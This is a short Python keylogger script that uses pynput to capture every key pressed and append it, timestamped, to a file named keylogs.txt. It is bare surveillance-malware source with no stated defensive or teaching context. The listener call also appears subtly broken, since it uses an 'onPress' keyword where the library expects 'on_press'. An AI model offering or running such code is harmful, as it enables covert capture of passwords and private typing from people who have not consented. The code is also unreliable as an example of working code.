from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir+"keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def onPress(key):
    logging.info(str(key))

with Listener(onPress=onPress) as listener:
    listener.join()